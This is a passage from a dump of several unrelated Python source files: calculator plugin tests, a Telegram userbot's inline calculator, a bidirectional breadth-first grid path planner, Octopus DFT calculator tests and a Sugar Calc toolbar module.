calc.register_plugin_and_enable(plugin)\n    l = [None]\n    for x in generate_test_values(4, sympy_objects=True, real=True, complex=True, include_edge_cases=False):\n        if abs(x) < 0.00000000001:\n            continue\n        l.append(x)\n        calc.command(f\"sympify('{str(x)}',rational=True)\")\n        assert \"Result\" in capfd.readouterr().out\n        assert abs(calc.context.out[-1].evalf() - x.evalf()) < 0.0001\n\n\ndef test_plugin_output_store_invalid():\n    plugin = OutputStore()\n    calc = TestCalculator()\n    plugin = OutputStore()\n    calc.register_plugin_and_enable(plugin)\n    for i in range(100):\n        calc.command(\"sympify(0)\")\n        calc.command(\"sympify(1)\")\n        calc.command(f\"Symbol('{random_str()}')\")\n    assert len(calc.context.out) == 1\n\n\ndef test_plugin_output_store_duplicates(capfd):\n    calc = TestCalculator()\n    plugin = OutputStore()\n    calc.register_plugin_and_enable(plugin)\n    l = [None]\n    for i in range(20):\n        s = random_str()\n        calc.command(f\"'{s}'\")\n        l.append(s)\n        assert \"Result\" in capfd.readouterr().out\n        assert len(calc.context.out) == len(l)\n        calc.command(f\"'{s}'\")\n        calc.command(f\"'{s}'\")\n        assert len(calc.context.out) == len(l)\n\n\ndef test_plugin_output_store_example(capfd):\n    calc = TestCalculator()\n    plugin = OutputStore()\n    calc.register_plugin_and_enable(plugin)\n    calc.command(\"x=Symbol('x')\")\n    r = calc.command(\"2*x\")\n    assert \"Result\" in capfd.readouterr().out\n    assert len(calc.context.out) == 2\n    assert calc.context.out[1] == calc.context.out[-1] == calc.command(\"out[1]\") == calc.command(\"out[-1]\") == r\n\n\ndef test_plugin_output_store_enable_switch(capfd):\n    calc = TestCalculator()\n    plugin = OutputStore()\n    calc.register_plugin(plugin)\n    calc.settings[plugin.setting_name] = False\n\n    for x in generate_test_values(2, False, real=True, complex=True):\n        calc.command(str(x))\n    for x in generate_test_values(2, True, real=True, complex=True):\n        calc.command(f\"sympify('{str(x)}')\")\n    assert capfd.readouterr().out.count(\"Decimal\") == 0\n", "172": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "173": "\"\"\"\n\nBidirectional Breadth-First grid planning\n\nauthor: Erwin Lejeune (@spida_rwin)\n\nSee Wikipedia article (https://en.wikipedia.org/wiki/Breadth-first_search)\n\n\"\"\"\n\nimport math\n\nimport matplotlib.pyplot as plt\n\nshow_animation = True\n\n\nclass BidirectionalBreadthFirstSearchPlanner:\n\n    def __init__(self, ox, oy, resolution, rr):\n        \"\"\"\n        Initialize grid map for bfs planning\n\n        ox: x position list of Obstacles [m]\n        oy: y position list of Obstacles [m]\n        resolution: grid resolution [m]\n        rr: robot radius[m]\n        \"\"\"\n\n        self.min_x, self.min_y = None, None\n        self.max_x, self.max_y = None, None\n        self.x_width, self.y_width, self.obstacle_map = None, None, None\n        self.resolution = resolution\n        self.rr = rr\n        self.calc_obstacle_map(ox, oy)\n        self.motion = self.get_motion_model()\n\n    class Node:\n        def __init__(self, x, y, cost, parent_index, parent):\n            self.x = x  # index of grid\n            self.y = y  # index of grid\n            self.cost = cost\n            self.parent_index = parent_index\n            self.parent = parent\n\n        def __str__(self):\n            return str(self.x) + \",\" + str(self.y) + \",\" + str(\n                self.cost) + \",\" + str(self.parent_index)\n\n    def planning(self, sx, sy, gx, gy):\n        \"\"\"\n        Bidirectional Breadth First search based planning\n\n        input:\n            s_x: start x position [m]\n            s_y: start y position [m]\n            gx: goal x position [m]\n            gy: goal y position [m]\n\n        output:\n            rx: x position list of the final path\n            ry: y position list of the final path\n        \"\"\"\n\n        start_node = self.Node(self.calc_xy_index(sx, self.min_x),\n                               self.calc_xy_index(sy, self.min_y), 0.0, -1,\n                               None)\n        goal_node = self.Node(self.calc_xy_index(gx, self.min_x),\n                              self.calc_xy_index(gy, self.min_y), 0.0, -1,\n                              None)\n\n        open_set_A, closed_set_A = dict(), dict()\n        open_set_B, closed_set_B = dict(), dict()\n        open_set_B[self.calc_grid_index(goal_node)] = goal_node\n        open_set_A[self.calc_grid_index(start_node)] = start_node\n\n        meet_point_A, meet_point_B = None, None\n\n        while 1:\n            if len(open_set_A) == 0:\n                print(\"Open set A is empty..\")\n                break\n\n            if len(open_set_B) == 0:\n                print(\"Open set B is empty\")\n                break\n\n            current_A = open_set_A.pop(list(open_set_A.keys())[0])\n            current_B = open_set_B.pop(list(open_set_B.keys())[0])\n\n            c_id_A = self.calc_grid_index(current_A)\n            c_id_B = self.calc_grid_index(current_B)\n\n            closed_set_A[c_id_A] = current_A\n            closed_set_B[c_id_B] = current_B\n\n            # show graph\n            if show_animation:  # pragma: no cover\n                plt.plot(self.calc_grid_position(current_A.x, self.min_x),\n                         self.calc_grid_position(current_A.y, self.min_y),\n                         \"xc\")\n                plt.plot(self.calc_grid_position(current_B.x, self.min_x),\n                         self.calc_grid_position(current_B.y, self.min_y),\n                         \"xc\")\n                # for stopping simulation with the esc key.\n                plt.gcf().canvas.mpl_connect(\n                    'key_release_event',\n                    lambda event: [exit(0) if event.key == 'escape' else None])\n                if len(closed_set_A.keys()) % 10 == 0:\n                    plt.pause(0.001)\n\n            if c_id_A in closed_set_B:\n                print(\"Find goal\")\n                meet_point_A = closed_set_A[c_id_A]\n                meet_point_B = closed_set_B[c_id_A]\n                break\n\n            elif c_id_B in closed_set_A:\n                print(\"Find goal\")\n                meet_point_A = closed_set_A[c_id_B]\n                meet_point_B = closed_set_B[c_id_B]\n                break\n\n            # expand_grid search grid based on motion model\n            for i, _ in enumerate(self.motion):\n                breakA = False\n                breakB = False\n\n                node_A = self.Node(current_A.x + self.motion[i][0],\n                                   current_A.y + self.motion[i][1],\n                                   current_A.cost + self.motion[i][2],\n                                   c_id_A, None)\n                node_B = self.Node(current_B.x + self.motion[i][0],\n                                   current_B.y + self.motion[i][1],\n                                   current_B.cost + self.motion[i][2],\n                                   c_id_B, None)\n\n                n_id_A = self.calc_grid_index(node_A)\n                n_id_B = self.calc_grid_index(node_B)\n\n                # If the node is not safe, do nothing\n                if not self.verify_node(node_A):\n                    breakA = True\n\n                if not self.verify_node(node_B):\n                    breakB = True\n\n                if (n_id_A not in closed_set_A) and \\\n                        (n_id_A not in open_set_A) and (not breakA):\n                    node_A.parent = current_A\n                    open_set_A[n_id_A] = node_A\n\n                if (n_id_B not in closed_set_B) and \\\n                        (n_id_B not in open_set_B) and (not breakB):\n                    node_B.parent = current_B\n                    open_set_B[n_id_B] = node_B\n\n        rx, ry = self.calc_final_path_bidir(\n            meet_point_A, meet_point_B, closed_set_A, closed_set_B)\n        return rx, ry\n\n    # takes both set and meeting nodes and calculate optimal path\n    def calc_final_path_bidir(self, n1, n2, setA, setB):\n        rxA, ryA = self.calc_final_path(n1, setA)\n        rxB, ryB = self.calc_final_path(n2, setB)\n\n        rxA.reverse()\n        ryA.reverse()\n\n        rx = rxA + rxB\n        ry = ryA + ryB\n\n        return rx, ry\n\n    def calc_final_path(self, goal_node, closed_set):\n        # generate final course\n        rx, ry = [self.calc_grid_position(goal_node.x, self.min_x)], [\n            self.calc_grid_position(goal_node.y, self.min_y)]\n        n = closed_set[goal_node.parent_index]\n        while n is not None:\n            rx.append(self.calc_grid_position(n.x, self.min_x))\n            ry.append(self.calc_grid_position(n.y, self.min_y))\n            n = n.parent\n\n        return rx, ry\n\n    def calc_grid_position(self, index, min_position):\n        \"\"\"\n        calc grid position\n\n        :param index:\n        :param min_position:\n        :return:\n        \"\"\"\n        pos = index * self.resolution + min_position\n        return pos\n\n    def calc_xy_index(self, position, min_pos):\n        return round((position - min_pos) / self.resolution)\n\n    def calc_grid_index(self, node):\n        return (node.y - self.min_y) * self.x_width + (node.x - self.min_x)\n\n    def verify_node(self, node):\n        px = self.calc_grid_position(node.x, self.min_x)\n        py = self.calc_grid_position(node.y, self.min_y)\n\n        if px < self.min_x:\n            return False\n        elif py < self.min_y:\n            return False\n        elif px >= self.max_x:\n            return False\n        elif py >= self.max_y:\n            return False\n\n        # collision check\n        if self.obstacle_map[node.x][node.y]:\n            return False\n\n        return True\n\n    def calc_obstacle_map(self, ox, oy):\n\n        self.min_x = round(min(ox))\n        self.min_y = round(min(oy))\n        self.max_x = round(max(ox))\n        self.max_y = round(max(oy))\n        print(\"min_x:\", self.min_x)\n        print(\"min_y:\", self.min_y)\n        print(\"max_x:\", self.max_x)\n        print(\"max_y:\", self.max_y)\n\n        self.x_width = round((self.max_x - self.min_x) / self.resolution)\n        self.y_width = round((self.max_y - self.min_y) / self.resolution)\n        print(\"x_width:\", self.x_width)\n        print(\"y_width:\", self.y_width)\n\n        # obstacle map generation\n        self.obstacle_map = [[False for _ in range(self.y_width)]\n                             for _ in range(self.x_width)]\n        for ix in range(self.x_width):\n            x = self.calc_grid_position(ix, self.min_x)\n            for iy in range(self.y_width):\n                y = self.calc_grid_position(iy, self.min_y)\n                for iox, ioy in zip(ox, oy):\n                    d = math.hypot(iox - x, ioy - y)\n                    if d <= self.rr:\n                        self.obstacle_map[ix][iy] = True\n                        break\n\n    @staticmethod\n    def get_motion_model():\n        # dx, dy, cost\n        motion = [[1, 0, 1],\n                  [0, 1, 1],\n                  [-1, 0, 1],\n                  [0, -1, 1],\n                  [-1, -1, math.sqrt(2)],\n                  [-1, 1, math.sqrt(2)],\n                  [1, -1, math.sqrt(2)],\n                  [1, 1, math.sqrt(2)]]\n\n        return motion\n\n\ndef main():\n    print(__file__ + \" start!!\")\n\n    # start and goal position\n    sx = 10.0  # [m]\n    sy = 10.0  # [m]\n    gx = 50.0  # [m]\n    gy = 50.0  # [m]\n    grid_size = 2.0  # [m]\n    robot_radius = 1.0  # [m]\n\n    # set obstacle positions\n    ox, oy = [], []\n    for i in range(-10, 60):\n        ox.append(i)\n        oy.append(-10.0)\n    for i in range(-10, 60):\n        ox.append(60.0)\n        oy.append(i)\n    for i in range(-10, 61):\n        ox.append(i)\n        oy.append(60.0)\n    for i in range(-10, 61):\n        ox.append(-10.0)\n        oy.append(i)\n    for i in range(-10, 40):\n        ox.append(20.0)\n        oy.append(i)\n    for i in range(0, 40):\n        ox.append(40.0)\n        oy.append(60.0 - i)\n\n    if show_animation:  # pragma: no cover\n        plt.plot(ox, oy, \".k\")\n        plt.plot(sx, sy, \"og\")\n        plt.plot(gx, gy, \"ob\")\n        plt.grid(True)\n        plt.axis(\"equal\")\n\n    bi_bfs = BidirectionalBreadthFirstSearchPlanner(\n        ox, oy, grid_size, robot_radius)\n    rx, ry = bi_bfs.planning(sx, sy, gx, gy)\n\n    if show_animation:  # pragma: no cover\n        plt.plot(rx, ry, \"-r\")\n        plt.pause(0.01)\n        plt.show()\n\n\nif __name__ == '__main__':\n    main()\n", "174": "import pytest\nimport numpy as np\n\nfrom ase.collections import g2\nfrom ase.build import bulk, graphene_nanoribbon\n\n\ndef calculate(factory, system, **kwargs):\n    calc = factory.calc(**kwargs)\n    system.calc = calc\n    system.get_potential_energy()\n    calc.get_eigenvalues()\n    return calc\n\n\ncalc = pytest.mark.calculator\n\n\n@calc('octopus', Spacing='0.25 * angstrom')\n@pytest.mark.xfail\ndef test_h2o(factory):\n    calc = calculate(factory,\n                     g2['H2O'],\n                     OutputFormat='xcrysden',\n                     SCFCalculateDipole=True)\n    dipole = calc.get_dipole_moment()\n    E = calc.get_potential_energy()\n\n    print('dipole', dipole)\n    print('energy', E)\n\n    # XXX What's with the dipole not being correct?\n    # XXX Investigate\n\n    assert pytest.approx(dipole, abs=0.02) == [0, 0, -0.37]\n    dipole_err = np.abs(dipole - [0., 0., -0.37]).max()\n    assert dipole_err < 0.02, dipole_err\n    #energy_err = abs(-463.5944954 - E)\n    #assert energy_err < 0.01, energy_err\n\n\n@calc('octopus', Spacing='0.2 * angstrom')\ndef test_o2(factory):\n    atoms = g2['O2']\n    atoms.center(vacuum=2.5)\n    calculate(factory,\n              atoms,\n              BoxShape='parallelepiped',\n              SpinComponents='spin_polarized',\n              ExtraStates=2)\n    #magmom = calc.get_magnetic_moment()\n    #magmoms = calc.get_magnetic_moments()\n    #print('magmom', magmom)\n    #print('magmoms', magmoms)\n\n\n@calc('octopus')\ndef test_si(factory):\n    calc = calculate(factory,\n                     bulk('Si'),  # , orthorhombic=True),\n                     KPointsGrid=[[4, 4, 4]],\n                     KPointsUseSymmetries=True,\n                     SmearingFunction='fermi_dirac',\n                     ExtraStates=2,\n                     Smearing='0.1 * eV',\n                     ExperimentalFeatures=True,\n                     Spacing='0.45 * Angstrom')\n    eF = calc.get_fermi_level()\n    print('eF', eF)\n\n\nif 0:  # This calculation does not run will in Octopus\n    # We will do the \"toothless\" spin-polarised Si instead.\n    calc = calculate('Fe',\n                     bulk('Fe', orthorhombic=True),\n                     KPointsGrid=[[4, 4, 4]],\n                     KPointsUseSymmetries=True,\n                     ExtraStates=4,\n                     Spacing='0.15 * Angstrom',\n                     SmearingFunction='fermi_dirac',\n                     Smearing='0.1 * eV',\n                     PseudoPotentialSet='sg15',\n                     ExperimentalFeatures=True,\n                     SpinComponents='spin_polarized')\n    eF = calc.get_fermi_level()\n    assert abs(eF - 5.33) < 1e-1\n    # XXXX octopus does not get magnetic state?\n    print('eF', eF)\n\nif 0:\n    # Experimental feature: mixed periodicity.  Let us not do this for now...\n    graphene = graphene_nanoribbon(2, 2, sheet=True)\n    graphene.positions = graphene.positions[:, [0, 2, 1]]\n    graphene.pbc = [1, 1, 0]  # from 1, 0, 1\n    calc = calculate('graphene',\n                     graphene,\n                     KPointsGrid=[[2, 1, 2]],\n                     KPointsUseSymmetries=True,\n                     ExperimentalFeatures=True,\n                     ExtraStates=4,\n                     SmearingFunction='fermi_dirac',\n                     Smearing='0.1 * eV')\n", "175": "", "176": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\n\nfrom . import get_help\n\n__doc__ = get_help(\"help_calculator\")\n\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: f\"{get}/100\"})\n            await e.answer(str(f\"{get}/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: f\"{get}/\"})\n            await e.answer(str(f\"{get}/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: f\"{get}*\"})\n            await e.answer(str(f\"{get}*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "177": "# -*- coding: utf-8 -*-\n# toolbars.py, see CalcActivity.py for info\n\nimport pygtk\npygtk.require('2.0')\nimport gtk\nfrom mathlib import MathLib\n\nfrom sugar.graphics.palette import Palette\nfrom sugar.graphics.menuitem import MenuItem\nfrom sugar.graphics.toolbutton import ToolButton\nfrom sugar.graphics.toggletoolbutton import ToggleToolButton\nfrom sugar.graphics.style import GRID_CELL_SIZE\n\nimport logging\n_logger = logging.getLogger('calc-activity')\n\nfrom gettext import gettext as _\n\n\ndef _icon_exists(name):\n    if name == '':\n        return False\n\n    theme = gtk.icon_theme_get_default()\n    info = theme.lookup_icon(name, 0, 0)\n    if info:\n        return True\n\n    return False\n\n\nclass IconToolButton(ToolButton):\n\n    def __init__(self, icon_name, text, cb, help_cb=None, alt_html=''):\n        ToolButton.__init__(self)\n\n        if _icon_exists(icon_name):\n            self.set_icon(icon_name)\n        else:\n            if alt_html == '':\n                alt_html = icon_name\n\n            label = gtk.Label()\n            label.set_markup(alt_html)\n            label.show()\n            self.set_label_widget(label)\n\n        self.create_palette(text, help_cb)\n\n        self.connect('clicked', cb)\n\n    def create_palette(self, text, help_cb):\n        p = Palette(text)\n\n        if help_cb is not None:\n            item = MenuItem(_('Help'), 'action-help')\n            item.connect('activate', help_cb)\n            item.show()\n            p.menu.append(item)\n\n        self.set_palette(p)\n\n\nclass IconToggleToolButton(ToggleToolButton):\n\n    def __init__(self, items, cb, desc):\n        ToggleToolButton.__init__(self)\n        self.items = items\n        if 'icon' in items[0] and _icon_exists(items[0]['icon']):\n            self.set_named_icon(items[0]['icon'])\n        elif 'html' in items[0]:\n            self.set_label(items[0]['html'])\n#        self.set_tooltip(items[0][1])\n        self.set_tooltip(desc)\n        self.selected = 0\n        self.connect('clicked', self.toggle_button)\n        self.callback = cb\n\n    def toggle_button(self, w):\n        self.selected = (self.selected + 1) % len(self.items)\n        but = self.items[self.selected]\n        if 'icon' in but and _icon_exists(but['icon']):\n            self.set_named_icon(but['icon'])\n        elif 'html' in but:\n            _logger.info('Setting html: %s', but['html'])\n            self.set_label(but['html'])\n#        self.set_tooltip(but[1])\n        if self.callback is not None:\n            if 'html' in but:\n                self.callback(but['html'])\n            else:\n                self.callback(but)\n\n\nclass TextToggleToolButton(gtk.ToggleToolButton):\n\n    def __init__(self, items, cb, desc, index=False):\n        gtk.ToggleToolButton.__init__(self)\n        self.items = items\n        self.set_label(items[0])\n        self.selected = 0\n        self.connect('clicked', self.toggle_button)\n        self.callback = cb\n        self.index = index\n        self.set_tooltip_text(desc)\n\n    def toggle_button(self, w):\n        self.selected = (self.selected + 1) % len(self.items)\n        but = self.items[self.selected]\n        self.set_label(but)\n        if self.callback is not None:\n            if self.index:\n                self.callback(self.selected)\n            else:\n                self.callback(but)\n\n\nclass LineSeparator(gtk.SeparatorToolItem):\n\n    def __init__(self):\n        gtk.SeparatorToolItem.__init__(self)\n        self.set_draw(True)\n\n\nclass EditToolbar(gtk.Toolbar):\n\n    def __init__(self, calc):\n        gtk.Toolbar.__init__(self)\n\n        copy_tool = ToolButton('edit-copy')\n        copy_tool.set_tooltip(_('Copy'))\n        copy_tool.set_accelerator(_('c'))\n        copy_tool.connect('clicked', lambda x: calc.text_copy())\n        self.insert(copy_tool, -1)\n\n        menu_item = MenuItem(_('Cut'))\n\n        try:\n            menu_item.set_accelerator(_('x'))\n        except AttributeError:\n            pass\n\n        menu_item.connect('activate', lambda x: calc.text_cut())\n        menu_item.show()\n        copy_tool.get_palette().menu.append(menu_item)\n\n        self.insert(IconToolButton('edit-paste', _('Paste'),\n                                   lambda x: calc.text_paste(),\n                                   alt_html='Paste'), -1)\n\n        self.show_all()\n\n\nclass AlgebraToolbar(gtk.Toolbar):\n\n    def __init__(self, calc):\n        gtk.Toolbar.__init__(self)\n\n        self.insert(IconToolButton('algebra-square', _('Square'),\n                                   lambda x: calc.button_pressed(\n                                       calc.TYPE_OP_POST, '**2'),\n                                   lambda x: calc.button_pressed(\n                                       calc.TYPE_TEXT, 'help(square)'),\n                                   alt_html='x2'), -1)\n\n        self.insert(IconToolButton('algebra-sqrt', _('Square root'),\n                                   lambda x: calc.button_pressed(\n                                       calc.TYPE_FUNCTION, 'sqrt'),\n                                   lambda x: calc.button_pressed(\n                                       calc.TYPE_TEXT, 'help(sqrt)'),\n                                   alt_html='\u221ax'), -1)\n\n        self.insert(IconToolButton('algebra-xinv', _('Inverse'),\n                                   lambda x: calc.button_pressed(\n                                       calc.TYPE_OP_POST, '**-1'),\n                                   lambda x: calc.button_pressed(\n                                       calc.TYPE_TEXT, 'help(inv)'),\n                                   alt_html='x-1'), -1)\n\n        self.insert(LineSeparator(), -1)\n\n        self.insert(IconToolButton('algebra-exp', _('e to the power x'),\n                                   lambda x: calc.button_pressed(\n                                       calc.TYPE_FUNCTION, 'exp'),\n                                   lambda x: calc.button_pressed(\n                                       calc.TYPE_TEXT, 'help(exp)'),\n                                   alt_html='ex'), -1)\n\n        self.insert(IconToolButton('algebra-xpowy', _('x to the power y'),\n                                   lambda x: calc.button_pressed(\n                                       calc.TYPE_FUNCTION, 'pow'),\n                                   lambda x: calc.button_pressed(\n                                       calc.TYPE_TEXT, 'help(pow)'),\n                                   alt_html='xy'), -1)\n\n        self.insert(IconToolButton('algebra-ln', _('Natural logarithm'),\n                                   lambda x: calc.button_pressed(\n                                       calc.TYPE_FUNCTION, 'ln'),\n                                   lambda x: calc.button_pressed(\n                                       calc.TYPE_TEXT, 'help(ln)')), -1)\n\n        self.insert(LineSeparator(), -1)\n\n        self.insert(IconToolButton(\n            'algebra-fac', _('Factorial'),\n            lambda x: calc.button_pressed(calc.TYPE_FUNCTION, 'factorial'),\n            lambda x: calc.button_pressed(calc.TYPE_TEXT,\n                                          'help(factorial)')), -1)\n\n        self.show_all()\n\n\nclass TrigonometryToolbar(gtk.Toolbar):\n\n    def __init__(self, calc):\n        gtk.Toolbar.__init__(self)\n\n        self.insert(IconToolButton(\n            'trigonometry-sin', _('Sine'),\n            lambda x: calc.button_pressed(calc.TYPE_FUNCTION, 'sin'),\n            lambda x: calc.button_pressed(calc.TYPE_TEXT, 'help(sin)')), -1)\n\n        self.insert(IconToolButton(\n            'trigonometry-cos', _('Cosine'),\n            lambda x: calc.button_pressed(calc.TYPE_FUNCTION, 'cos'),\n            lambda x: calc.button_pressed(calc.TYPE_TEXT, 'help(cos)')), -1)\n\n        self.insert(IconToolButton(\n            'trigonometry-tan', _('Tangent'),\n            lambda x: calc.button_pressed(calc.TYPE_FUNCTION, 'tan'),\n            lambda x: calc.button_pressed(calc.TYPE_TEXT, 'help(tan)')), -1)\n\n        self.insert(LineSeparator(), -1)\n\n        self.insert(IconToolButton(\n            'trigonometry-asin', _('Arc sine'),\n            lambda x: calc.button_pressed(calc.TYPE_FUNCTION, 'asin'),\n            lambda x: calc.button_pressed(calc.TYPE_TEXT, 'help(asin)')), -1)\n\n        self.insert(IconToolButton(\n            'trigonometry-acos', _('Arc cosine'),\n            lambda x: calc.button_pressed(calc.TYPE_FUNCTION, 'acos'),\n            lambda x: calc.button_pressed(calc.TYPE_TEXT, 'help(acos)')), -1)\n\n        self.insert(IconToolButton(\n            'trigonometry-atan', _('Arc tangent'),\n            lambda x: calc.button_pressed(calc.TYPE_FUNCTION, 'atan'),\n            lambda x: calc.button_pressed(calc.TYPE_TEXT, 'help(atan)')), -1)\n\n        self.insert(LineSeparator(), -1)\n\n        self.insert(IconToolButton(\n            'trigonometry-sinh', _('Hyperbolic sine'),\n            lambda x: calc.button_pressed(calc.TYPE_FUNCTION, 'sinh'),\n            lambda x: calc.button_pressed(calc.TYPE_TEXT, 'help(sinh)')), -1)\n\n        self.insert(IconToolButton(\n            'trigonometry-cosh', _('Hyperbolic cosine'),\n            lambda x: calc.button_pressed(calc.TYPE_FUNCTION, 'cosh'),\n            lambda x: calc.button_pressed(calc.TYPE_TEXT, 'help(cosh)')), -1)\n\n        self.insert(IconToolButton(\n            'trigonometry-tanh', _('Hyperbolic tangent'),\n            lambda x: calc.button_pressed(calc.TYPE_FUNCTION, 'tanh'),\n            lambda x: calc.button_pressed(calc.TYPE_TEXT, 'help(tanh)')), -1)\n\n        self.show_all()\n\n\nclass BooleanToolbar(gtk.Toolbar):\n\n    def __init__(self, calc):\n        gtk.Toolbar.__init__(self)\n\n        self.insert(IconToolButton(\n            'boolean-and', _('Logical and'),\n            lambda x: calc.button_pressed(calc.TYPE_OP_POST, '&'),\n            lambda x: 